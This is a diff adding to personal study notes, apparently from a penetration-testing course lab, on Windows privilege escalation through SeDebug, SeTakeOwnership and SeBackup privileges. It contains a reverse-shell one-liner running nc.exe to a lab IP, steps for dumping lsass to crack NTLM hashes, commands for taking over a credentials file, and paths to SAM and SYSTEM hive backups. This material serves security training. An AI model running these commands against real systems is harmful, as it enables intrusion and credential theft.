@@ -137,3 +137,59 @@ xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd
 ```
 ### SeDebugPrivilege
 To run a particular application or service or assist with troubleshooting, a user might be assigned the [SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) instead of adding the account into the administrators group. This privilege can be assigned via local or domain group policy, under `Computer Settings > Windows Settings > Security Settings`. By default, only administrators are granted this privilege as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures.
+
+this privilege allow us to dump lssas file
+
+> Task manager -> details -> lsass.exe -> Create dump file
+
+We can then try to read and crack NTLM hash. using [pypykatz](https://github.com/skelsec/pypykatz)
+First, transfer this [PoC script](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) over to the target system. Next we just load the script and run it with the following syntax `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`. Note that we must add a third blank argument `""` at the end for the PoC to work properly.
+
+We save the scrip, we target a process id, then we execute the script. if we have **SeDebugPrivilege** set to true. again we can check by opening a powershell in high priv mod and run `whoami /priv`
+```powershell
+./script.ps1; [MyProcess]::CreateProcessFromParent((Get-Process "Process name lsas or winlogon ...").id, "c:\Windows\System32\cmd.exe", "")
+```
+Other tools such as [this one](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) exist to pop a SYSTEM shell when we have `SeDebugPrivilege`
+
+### SeTakeOwnershipPrivilege
+[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns [WRITE_OWNER](https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights) rights over an object, meaning the user can change the owner within the object's security descriptor.
+First start enabling it with this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) which is detailed in [this](https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/) blog post, as well as [this](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) one which builds on the initial concept.
+to take the ownership of the filewe can use the [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) Windows binary
+```powershell-session
+ takeown /f 'C:\Department Shares\Private\IT\cred.txt'
+```
+We may still not be able to read the file and need to modify the file ACL using `icacls` to be able to read it.
+
+```powershell-session
+icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
+```
+
+these are some interesting files to look up.
+```shell-session
+c:\inetpub\wwwwroot\web.config
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software, %WINDIR%\repair\security
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav
+%WINDIR%\system32\config\system.sav
+```
+
+## Windows Group Privileges
+to see group privileges we can use the command `whoami /groups` 
+
+### Backup Operators
+Membership of this group grants its members the `SeBackup` and `SeRestore` privileges. The [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges) allows us to traverse any folder and list the folder contents. which means we can copy a file from folder even tho we don't have access control entry.
+but this can't be done with the normal copy command, it has so be done programmatically with [PoC](https://github.com/giuliano108/SeBackupPrivilege) to exploit the `SeBackupPrivilege`, and copy this file. First, let's import the libraries in a PowerShell session.
+```powershell-session
+PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
+PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
+```
+
+Let's check if `SeBackupPrivilege` is enabled by invoking `whoami /priv` or `Get-SeBackupPrivilege` cmdlet. If the privilege is disabled, we can enable it with `Set-SeBackupPrivilege`.
+
+>[!info]
+>Based on the server's settings, it might be required to spawn an elevated CMD prompt to bypass UAC and have this privilege.
+
